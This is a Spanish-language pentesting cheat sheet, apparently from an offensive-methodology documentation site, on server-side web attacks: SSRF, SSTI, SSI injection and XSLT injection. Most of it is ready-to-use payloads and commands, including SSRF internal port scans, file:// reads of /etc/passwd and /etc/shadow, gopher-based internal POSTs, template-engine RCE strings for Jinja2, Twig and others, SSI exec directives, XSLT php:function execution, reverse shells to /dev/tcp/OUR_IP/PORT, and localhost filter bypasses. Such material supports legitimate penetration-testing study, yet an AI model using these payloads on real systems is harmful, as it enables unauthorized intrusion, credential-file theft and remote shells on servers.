---
title: "Server-side Attacks"
description: "SSRF, SSTI, SSI injection y XSLT injection."
sidebar:
  order: 12
  label: "Server-side Attacks"
---
> SSRF, SSTI, SSI Injection y XSLT Injection: identificación, explotación y herramientas para cada vector de ataque server-side.

---


## SSRF — Server-Side Request Forgery

### Confirmar SSRF

```bash
# 1. Identificar parámetro que acepta URL (ej: dateserver=http://...)
# 2. Lanzar listener
nc -lnvp 8000

# 3. Inyectar URL propia en el parámetro
curl -X POST http://TARGET/index.php \
     -d "dateserver=http://OUR_IP:8000/ssrf&date=2024-01-01"
# Si nc recibe conexión → SSRF confirmado

# 4. Verificar si es blind (response no se refleja)
curl -X POST http://TARGET/index.php \
     -d "dateserver=http://127.0.0.1/index.php&date=2024-01-01"
# Si response contiene HTML de la app → no blind; si responde genérico → blind SSRF
```

### Port scan interno via SSRF

```bash
# Identificar error en puerto cerrado (ej: "Failed to connect to")
# Luego filtrar para encontrar puertos abiertos

seq 1 10000 > ports.txt

ffuf -w ./ports.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
     -fr "Failed to connect to"

# Puertos típicos a encontrar:
# 80/443 → web app interna
# 3306 → MySQL
# 5432 → PostgreSQL
# 6379 → Redis
# 27017 → MongoDB
# 8080/8443 → Tomcat/otro servicio
```

### Enumerar endpoints internos via SSRF

```bash
# Directory brute-force via SSRF (accediendo a dominio interno no accesible directamente)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "dateserver=http://internal.htb/FUZZ.php&date=2024-01-01" \
     -fr "Server at internal.htb Port 80"   # filtra 404 y 403 de Apache
```

### LFI via file://

```bash
# Leer archivos locales del servidor a través de SSRF
curl -X POST http://TARGET/index.php \
     -d "dateserver=file:///etc/passwd&date=2024-01-01"

# Archivos objetivo:
# file:///etc/passwd
# file:///etc/shadow (si hay privilegios)
# file:///var/www/html/config.php
# file:///proc/self/environ
```

### Gopher — POST requests via SSRF

```bash
# Construir HTTP POST request manualmente para enviar via gopher://
# Payload en texto plano:
POST /admin.php HTTP/1.1
Host: internal.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin

# Convertir a URL gopher (espacios=%20, newlines=%0D%0A):
# gopher://internal.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20internal.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

# URL-encodear la URL gopher COMPLETA antes de ponerla en el parámetro POST
# (double encoding: %25 para %, %252F para /)

# Herramienta: Gopherus (Python2)
git clone https://github.com/tarunkant/Gopherus
python2.7 gopherus.py --exploit smtp    # SMTP
python2.7 gopherus.py --exploit mysql   # MySQL
python2.7 gopherus.py --exploit redis   # Redis
```

### Blind SSRF — técnicas

```bash
# Enumerar puertos: buscar diferencias en mensajes de error
# Puerto abierto (HTTP válido): "date unavailable"
# Puerto cerrado: "Something went wrong!"

# Enumerar archivos: diferencia de error para existente vs no existente
# Archivo existe: "date unavailable"
# Archivo no existe: "Something went wrong!"

# Interactuar con servicios internos "a ciegas" → payloads conocidos
```

---

## SSTI — Server-Side Template Injection

### Confirmar y detectar el engine

```bash
# 1. String de prueba (rompe la mayoría de template engines)
${{<%[%'"}}%\.

# 2. Si hay error → probar payloads de identificación
${7*7}      # → no ejecutado: seguir por Jinja/Twig path
{{7*7}}     # → ejecutado como 49: seguir

# 3. Identificar engine exacto
{{7*'7'}}   # Jinja2 → "7777777" | Twig → "49"

# Árbol de decisión completo:
# ${7*7} ejecutado → Freemarker o similares
# ${7*7} no ejecutado → probar {{7*7}}
#   {{7*7}} ejecutado → probar {{7*'7'}}
#     Resultado "7777777" → Jinja2 (Python)
#     Resultado "49" → Twig (PHP)
#   {{7*7}} no ejecutado → probar #{7*7} → Smarty/otros
```

### Jinja2 (Flask/Django — Python)

```jinja2
# Info disclosure — config de la app (secret keys, etc.)
{{ config.items() }}

# Built-in functions disponibles
{{ self.__init__.__globals__.__builtins__ }}

# LFI — leer archivos
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE — ejecutar comandos (importar os si no está disponible)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# RCE alternativo más corto (si os ya está importado)
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# Reverse shell via SSTI Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/OUR_IP/PORT 0>&1"').read() }}
```

### Twig (Symfony/PHP)

```twig
# Info disclosure
{{ _self }}

# LFI (requiere Symfony → filter file_excerpt)
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# RCE — usar system() de PHP via filter
{{ ['id'] | filter('system') }}

# RCE con comando personalizado
{{ ['bash -c "id"'] | filter('system') }}

# Reverse shell
{{ ['bash -c "bash -i >& /dev/tcp/OUR_IP/PORT 0>&1"'] | filter('system') }}
```

### Otros engines — payloads básicos

| Engine | Info | RCE |
|--------|------|-----|
| **Freemarker** | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Smarty** | `{php}echo 'test';{/php}` | `{system('id')}` |
| **Velocity** | `$class.inspect("java.lang.Runtime")` | `#set($e="")$e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)` |
| **Pebble** | `{{ 1+1 }}` | `{% set cmd = "id" %}{% set exec = "java.lang.Runtime".exec(cmd) %}` |

### SSTImap — herramienta automática

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt

# Detección automática
python3 sstimap.py -u http://TARGET/index.php?name=test

# Ejecutar comando
python3 sstimap.py -u http://TARGET/index.php?name=test -S id

# Shell interactivo
python3 sstimap.py -u http://TARGET/index.php?name=test --os-shell

# Descargar archivo
python3 sstimap.py -u http://TARGET/index.php?name=test -D '/etc/passwd' './passwd'

# POST parameter
python3 sstimap.py -u http://TARGET/index.php -X POST -d "name=test" --engine Jinja2
```

---

## SSI Injection — Server-Side Includes

### Identificar SSI

```bash
# Extensiones que suelen usar SSI: .shtml, .shtm, .stm
# Buscar en la respuesta o URL:
curl -s http://TARGET/ | grep -iE "\.shtml|\.shtm|\.stm"

# También posible en .html si el servidor está configurado para ello
```

### Payloads SSI

```html
<!-- Confirmar SSI injection (imprimir variables de entorno) -->
<!--#printenv -->

<!-- Echo de variables específicas -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="LAST_MODIFIED" -->

<!-- RCE via exec (impacto máximo) -->
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/OUR_IP/PORT 0>&1'" -->

<!-- Include de archivo local -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="config.php" -->

<!-- Config SSI (cambiar mensaje de error) -->
<!--#config errmsg="Error!" -->
```

### Ejemplo de explotación

```bash
# Si el campo "name" en un form se refleja en una página .shtml:
curl -X POST http://TARGET/form.php \
     -d "name=<!--%23exec%20cmd%3D%22id%22%20-->"

# URL encoded: <!--#exec cmd="id" -->
# %3C%21--%23exec%20cmd%3D%22id%22%20--%3E

# Sin encoding si el form acepta HTML directamente:
# Introducir en el campo: <!--#exec cmd="id" -->
```

---

## XSLT Injection

### Confirmar XSLT Injection

```bash
# Inyectar un tag XML roto para provocar error
# Introducir en el campo: <
# Si responde 500 → posible XSLT injection
```

### Información del procesador

```xml
<!-- Inyectar en el parámetro vulnerable -->
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

### LFI via XSLT

```xml
<!-- XSLT 2.0 (unparsed-text) -->
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />

<!-- PHP functions habilitadas (libxslt con PHP) -->
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />

<!-- Versión alternativa con readfile -->
<xsl:value-of select="php:function('readfile','/etc/passwd')" />
```

### RCE via XSLT

```xml
<!-- PHP functions habilitadas -->
<xsl:value-of select="php:function('system','id')" />
<xsl:value-of select="php:function('shell_exec','id')" />
<xsl:value-of select="php:function('passthru','id')" />

<!-- Reverse shell via XSLT + PHP -->
<xsl:value-of select="php:function('system','bash -c &quot;bash -i &gt;&amp; /dev/tcp/OUR_IP/PORT 0&gt;&amp;1&quot;')" />
```

---

## Identificación rápida de vulnerabilidad

| Señal | Tipo probable |
|-------|---------------|
| Parámetro con URL completa en POST body | SSRF |
| Error al inyectar `${{<%[%'"}}%\.` en campo de texto | SSTI |
| URL termina en `.shtml`, `.shtm`, `.stm` | SSI |
| Campo de texto reflejado en página con datos XML/XSL | XSLT |
| Campo "dateserver", "url", "page", "resource" con valor http | SSRF |
| Output refleja `{{7*7}}` como `49` | SSTI (Jinja/Twig) |

---

## Pitfalls / Gotchas

- **SSRF blind:** si la respuesta no se refleja, usar diferencias sutiles de error (mensaje distinto para puerto abierto vs cerrado). Siempre confirmar primero con nc listener propio.
- **Gopher double encoding:** la URL gopher dentro de un parámetro POST necesita URL-encoding doble (`%25` para `%`, `%252F` para `/`). Sin esto → `Malformed URL` error.
- **SSTI: `{{7*'7'}}` para distinguir Jinja vs Twig:** Jinja → `7777777`, Twig → `49`. No intentar RCE directo sin identificar el engine — la sintaxis es diferente.
- **SSI `exec` puede estar deshabilitado:** si `<!--#exec cmd="id" -->` no funciona pero `<!--#printenv -->` sí, el `exec` directive está deshabilitado en la config del servidor.
- **XSLT: `php:function` solo si está habilitado:** la mayoría de las instalaciones de libxslt deshabilitan PHP functions por seguridad. Sin `php:function`, probar `unparsed-text` (solo XSLT 2.0+).
- **SSTImap detecta pero no siempre explota:** si SSTImap identifica el engine pero falla en RCE, intentar los payloads manuales específicos del engine.
- **SSRF filter bypass:** si el servidor filtra `127.0.0.1`, probar: `localhost`, `0.0.0.0`, `[::1]`, `127.1`, `127.0.1`, `0x7F000001` (hex), `2130706433` (decimal).

---

## Cheatsheets relacionados

- [Web Requests](/metodologias/fundamentos/web-requests/) — HTTP, cURL, curl para SSRF manual
- [Web Fuzzing](/metodologias/recon/web-fuzzing/) — ffuf para port scan vía SSRF, enumerar endpoints
- [JavaScript Deobfuscation](/metodologias/recon/javascript-deobfuscation/) — encontrar parámetros URL en JS
- [API Attacks](/metodologias/web/api-attacks/) — SSRF en contextos de API REST
- [Attacking GraphQL](/metodologias/web/attacking-graphql/) — SSRF via GraphQL queries
